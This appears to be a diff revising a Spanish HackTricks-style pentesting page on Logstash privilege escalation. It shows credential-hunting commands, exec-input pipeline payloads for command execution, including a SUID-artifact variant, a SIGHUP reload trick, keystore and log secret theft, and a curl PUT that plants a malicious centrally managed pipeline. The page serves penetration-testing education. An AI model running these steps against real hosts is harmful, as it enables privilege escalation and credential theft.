@@ -1,14 +1,12 @@
-# Escalada de privilegios en Logstash
-
-{{#include ../../banners/hacktricks-training.md}}
+# Escalada de privilegios de Logstash
 
 ## Logstash
 
-Logstash se utiliza para **recopilar, transformar y distribuir logs** mediante un sistema conocido como **pipelines**. Estos pipelines están compuestos por etapas de **input**, **filter** y **output**. Un aspecto interesante surge cuando Logstash opera en una máquina comprometida.
+Logstash se utiliza para **recopilar, transformar y enviar logs** mediante un sistema conocido como **pipelines**. Estos pipelines están compuestos por etapas de **input**, **filter** y **output**.<sup>[[4]](#references)</sup> Surge un aspecto interesante cuando Logstash opera en una máquina comprometida.
 
-### Configuración del pipeline
+### Configuración de pipelines
 
-Los pipelines se configuran en el archivo **/etc/logstash/pipelines.yml**, que indica las ubicaciones de las configuraciones de los pipelines:
+En las instalaciones de paquetes Debian y RPM, los pipelines se configuran mediante **/etc/logstash/pipelines.yml**, que enumera las ubicaciones de las configuraciones de los pipelines; otras distribuciones colocan `pipelines.yml` en el directorio `path.settings` de Logstash.<sup>[[5]](#references)[[6]](#references)</sup>
 ```yaml
 # Define your pipelines here. Multiple pipelines can be defined.
 # For details on multiple pipelines, refer to the documentation:
@@ -20,12 +18,12 @@ path.config: "/etc/logstash/conf.d/*.conf"
 path.config: "/usr/share/logstash/pipeline/1*.conf"
 pipeline.workers: 6
 ```
-Este archivo revela dónde se encuentran los archivos **.conf** que contienen las configuraciones de los pipelines. Al emplear un **Elasticsearch output module**, es común que los **pipelines** incluyan **credenciales de Elasticsearch**, que a menudo poseen privilegios amplios debido a que Logstash necesita escribir datos en Elasticsearch. Los comodines en las rutas de configuración permiten que Logstash ejecute todos los pipelines que coincidan en el directorio designado.
+Este archivo revela dónde se encuentran los archivos **.conf** que contienen las configuraciones de pipeline. Al usar una salida de **Elasticsearch**, inspecciona sus configuraciones `user`/`password`, `cloud_auth` o `api_key`; los privilegios efectivos de la cuenta dependen de Elasticsearch. Un glob `path.config` carga todos los archivos coincidentes para ese pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>
 
-Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se analizan como una única configuración**. Esto crea 2 implicaciones ofensivas:
+Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, `-f` tiene prioridad y **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se analizan como una única configuración**.<sup>[[6]](#references)[[7]](#references)</sup> Esto crea 2 implicaciones ofensivas:
 
-- Un archivo agregado, como `000-input.conf` o `zzz-output.conf`, puede modificar la forma en que se ensambla el pipeline final
-- Un archivo malformado puede impedir la carga del pipeline completo, por lo que debes validar cuidadosamente los payloads antes de depender de la recarga automática
+- Un archivo colocado como `000-input.conf` o `zzz-output.conf` puede cambiar cómo se ensambla el pipeline final
+- Un archivo con formato incorrecto puede hacer que la configuración combinada no supere la validación; durante la recarga, Logstash conserva el pipeline anterior, por lo que debes validar los payloads antes de depender de la recarga automática.<sup>[[1]](#references)</sup>
 
 ### Enumeración rápida en un host comprometido
 
@@ -38,29 +36,29 @@ cat /etc/logstash/logstash.yml 2>/dev/null
 find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
 rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
 ```
-Comprueba también si la API de monitorización local es accesible. De forma predeterminada, se enlaza a **127.0.0.1:9600**, lo que normalmente es suficiente después de obtener acceso al host:
+Comprueba también si la API de monitorización local es accesible. De forma predeterminada, se enlaza en **127.0.0.1:9600**, lo que suele ser suficiente después de acceder al host.<sup>[[8]](#references)</sup>
 ```bash
 curl -s http://127.0.0.1:9600/?pretty
 curl -s http://127.0.0.1:9600/_node/pipelines?pretty
 curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
 ```
-Esto normalmente te proporciona los ID de los pipelines, detalles del runtime y confirmación de que tu pipeline modificado se ha cargado.
+Estos endpoints exponen los IDs y la configuración de los pipelines, las métricas de ejecución y los contadores de éxito o fallo de la recarga de configuración, lo que ayuda a confirmar si se aceptó un cambio.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>
 
-Las credenciales recuperadas de Logstash suelen permitir acceder a **Elasticsearch**, así que consulta [esta otra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).
+Si una credencial recuperada apunta a **Elasticsearch**, consulta [esta otra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).
 
-### Escalada de privilegios mediante pipelines escribibles
+### Escalada de privilegios mediante Pipelines modificables
 
-Para intentar una escalada de privilegios, identifica primero el usuario con el que se está ejecutando el servicio Logstash, normalmente el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:
+Para intentar una escalada de privilegios, identifica primero el usuario con el que realmente se está ejecutando el servicio Logstash; no asumas que es root o el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:
 
 - Tener **acceso de escritura** a un archivo **.conf** de un pipeline **o**
-- El archivo **/etc/logstash/pipelines.yml** utiliza un comodín y puedes escribir en la carpeta de destino
+- Que el archivo **/etc/logstash/pipelines.yml** utilice un comodín y puedas escribir en la carpeta objetivo.<sup>[[6]](#references)[[7]](#references)</sup>
 
-Además, se debe cumplir **una** de estas condiciones:
+Además, debe cumplirse **una** de estas condiciones:
 
 - Poder reiniciar el servicio Logstash **o**
-- El archivo **/etc/logstash/logstash.yml** tiene configurado `config.reload.automatic: true`
+- Que el archivo **/etc/logstash/logstash.yml** tenga establecido **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>
 
-Dado que hay un comodín en la configuración, crear un archivo que coincida con este comodín permite ejecutar comandos. Por ejemplo:
+Dado que hay un comodín en la configuración, crear un archivo que coincida con este comodín permite ejecutar comandos.<sup>[[7]](#references)[[9]](#references)</sup> Por ejemplo:
 ```bash
 input {
 exec {
@@ -76,15 +74,15 @@ codec => rubydebug
 }
 }
 ```
-Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo proporcionado, el comando **whoami** se ejecuta cada 120 segundos y su salida se dirige a **/tmp/output.log**.
+Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo proporcionado, el comando **whoami** se ejecuta cada 120 segundos y su salida se dirige a **/tmp/output.log**.<sup>[[9]](#references)</sup>
 
-Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente las configuraciones de pipeline nuevas o modificadas sin necesidad de reiniciarse.<sup>[[1]](#references)</sup> Si no hay ningún comodín, aún se pueden realizar modificaciones en las configuraciones existentes, pero se recomienda tener precaución para evitar interrupciones.
+Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente las configuraciones de pipeline nuevas o modificadas sin necesidad de reiniciarse.<sup>[[1]](#references)[[15]](#references)</sup> Si no hay ningún comodín, aún se pueden realizar modificaciones en las configuraciones existentes, pero se recomienda tener precaución para evitar interrupciones.
 
 ### Payloads de Pipeline más fiables
 
-El plugin de entrada `exec` sigue funcionando en las versiones actuales y requiere un `interval` o un `schedule`. Se ejecuta haciendo **fork** de la JVM de Logstash, por lo que, si la memoria es limitada, tu payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.
+El plugin de entrada `exec` todavía funciona en las versiones actuales y requiere un `interval` o un `schedule`. Se ejecuta haciendo **fork** de la JVM de Logstash, por lo que, si la memoria es limitada, el payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.<sup>[[9]](#references)</sup>
 
-Un payload de privilege-escalation más práctico suele ser uno que deje un artefacto persistente:
+Cuando el servicio tiene privilegios suficientes para crear un archivo SUID propiedad de root, un payload práctico de escalada de privilegios es aquel que deja un artefacto persistente:
 ```bash
 input {
 exec {
@@ -100,16 +98,16 @@ Si no tienes permisos para reiniciar, pero puedes enviar señales al proceso, Lo
 ```bash
 kill -SIGHUP $(pgrep -f logstash)
 ```
-Ten en cuenta que no todos los plugins permiten la recarga. Por ejemplo, la entrada **stdin** impide la recarga automática, así que no des por sentado que `config.reload.automatic` siempre detectará tus cambios.<sup>[[1]](#references)</sup>
+Ten en cuenta que no todos los plugins permiten la recarga. Por ejemplo, la entrada **stdin** impide la recarga automática, así que no asumas que `config.reload.automatic` siempre detectará tus cambios.<sup>[[1]](#references)</sup>
 
-### Robar secretos de Logstash
+### Robo de secretos de Logstash
 
 Antes de centrarte únicamente en la ejecución de código, recopila los datos a los que Logstash ya tiene acceso:
 
-- Las credenciales en texto plano suelen estar hardcodeadas dentro de las salidas `elasticsearch {}`, `http_poller`, las entradas JDBC o la configuración relacionada con la nube
-- La configuración segura puede encontrarse en **`/etc/logstash/logstash.keystore`** o en otro directorio `path.settings`
-- La contraseña del keystore suele proporcionarse mediante **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones basadas en paquetes normalmente la obtienen de **`/etc/sysconfig/logstash`**
-- La expansión de variables de entorno mediante `${VAR}` se resuelve durante el inicio de Logstash, por lo que conviene inspeccionar el entorno del servicio
+- Las credenciales pueden aparecer en las salidas `elasticsearch {}`, las URL o configuraciones de `http_poller`, las entradas JDBC o la configuración relacionada con cloud; estos plugins exponen campos de credenciales que conviene buscar.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
+- La configuración segura puede encontrarse en **`/etc/logstash/logstash.keystore`** o en otro directorio `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
+- La contraseña del keystore puede proporcionarse mediante **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones RPM/DEB obtienen las variables de entorno del servicio desde **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
+- La expansión de variables de entorno mediante `${VAR}` se resuelve cuando Logstash se inicia, por lo que conviene inspeccionar el entorno del servicio.<sup>[[14]](#references)</sup>
 
 Comprobaciones útiles:
 ```bash
@@ -120,36 +118,59 @@ cat /etc/sysconfig/logstash 2>/dev/null
 journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
 ls -lah /var/log/logstash 2>/dev/null
 ```
-También vale la pena comprobar esto porque **CVE-2023-46672** mostró que Logstash podía registrar información sensible en los logs bajo circunstancias específicas. Por lo tanto, en un host de post-exploitation, los logs antiguos de Logstash y las entradas de `journald` podrían revelar credenciales incluso si la configuración actual hace referencia al keystore en lugar de almacenar los secretos directamente.<sup>[[3]](#references)</sup>
+También vale la pena comprobar esto porque **CVE-2023-46672** demostró que, bajo circunstancias específicas, Logstash registraba información sensible en sus logs, incluidos secretos almacenados en su keystore y referenciados desde la configuración; revisa los logs antiguos de Logstash y las entradas de `journald` si dichas circunstancias podrían aplicarse.<sup>[[3]](#references)</sup>
 
 ### Abuso de la gestión centralizada de pipelines
 
-En algunos entornos, el host **no** depende en absoluto de archivos `.conf` locales. Si está configurado **`xpack.management.enabled: true`**, Logstash puede obtener pipelines gestionados centralmente desde Elasticsearch/Kibana y, después de habilitar este modo, las configuraciones de pipelines locales dejan de ser la fuente de verdad.<sup>[[2]](#references)</sup>
+En algunos entornos, el host **no** depende en absoluto de archivos `.conf` locales. Si está configurado **`xpack.management.enabled: true`**, Logstash puede obtener pipelines gestionados centralmente desde Elasticsearch/Kibana, y después de habilitar este modo, las configuraciones locales de los pipelines dejan de ser la fuente de verdad.<sup>[[2]](#references)</sup>
 
-Esto implica una vía de ataque diferente:
+Esto implica una ruta de ataque diferente:
 
-1. Recuperar las credenciales de Elastic de la configuración local de Logstash, el keystore o los logs
-2. Verificar si la cuenta tiene el privilegio de clúster **`manage_logstash_pipelines`**
-3. Crear o reemplazar un pipeline gestionado centralmente para que el host de Logstash ejecute tu payload en su siguiente intervalo de consulta
+1. Recupera las credenciales de Elastic desde la configuración local de Logstash, el keystore o los logs.<sup>[[3]](#references)[[10]](#references)</sup>
+2. Verifica si la cuenta tiene el privilegio de clúster **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
+3. Crea o reemplaza un pipeline gestionado centralmente para que el host de Logstash ejecute tu payload en su próximo intervalo de consulta.<sup>[[2]](#references)[[16]](#references)</sup>
 
-La API de Elasticsearch utilizada para esta función es:<sup>[[2]](#references)</sup>
+La API de Elasticsearch utilizada para esta funcionalidad es:<sup>[[16]](#references)</sup>
 ```bash
 curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
 -H 'Content-Type: application/json' \
 -u user:password \
 -d '{
 "description": "malicious pipeline",
+"last_modified": "2026-01-02T02:50:51.250Z",
+"username": "user",
 "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
 "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
-"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
+"pipeline_settings": {
+"pipeline.workers": 1,
+"pipeline.batch.size": 1,
+"pipeline.batch.delay": 50,
+"queue.type": "memory",
+"queue.max_bytes": "1gb",
+"queue.checkpoint.writes": 1024
+}
 }'
 ```
-Esto es especialmente útil cuando los archivos locales son de solo lectura, pero Logstash ya está registrado para obtener pipelines de forma remota.
+Esto resulta especialmente útil cuando los archivos locales son de solo lectura, pero Logstash ya está registrado para obtener pipelines de forma remota.<sup>[[2]](#references)[[16]](#references)</sup>
 
-## Referencias
+## References
 
-- [1] [Elastic Docs: Recarga del archivo de configuración](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
-- [2] [Elastic Docs: Configuración de la gestión centralizada de pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
+- [1] [Documentación de Elastic: Recargar el archivo de configuración](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
+- [2] [Documentación de Elastic: Configurar la gestión centralizada de pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
 - [3] [Actualización de seguridad de Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
-
+- [4] [Documentación de Elastic: Crear un pipeline de Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
+- [5] [Documentación de Elastic: Diseño de directorios de Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
+- [6] [Documentación de Elastic: Múltiples pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
+- [7] [Documentación de Elastic: Ejecutar Logstash desde la línea de comandos](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
+- [8] [Documentación de Elastic: Supervisar Logstash con APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
+- [9] [Documentación de Elastic: Plugin de entrada Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
+- [10] [Documentación de Elastic: Keystore de secretos para configuraciones seguras](https://www.elastic.co/docs/reference/logstash/keystore)
+- [11] [Documentación de Elastic: Plugin de salida Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
+- [12] [Documentación de Elastic: Plugin de entrada Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
+- [13] [Documentación de Elastic: Plugin de entrada Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
+- [14] [Documentación de Elastic: Usar variables de entorno](https://www.elastic.co/docs/reference/logstash/environment-variables)
+- [15] [Documentación de Elastic: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
+- [16] [API de Elasticsearch: Crear o actualizar un pipeline de Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
+- [17] [API de Logstash: Obtener la configuración de los pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
+- [18] [API de Logstash: Obtener estadísticas de los pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
 {{#include ../../banners/hacktricks-training.md}}
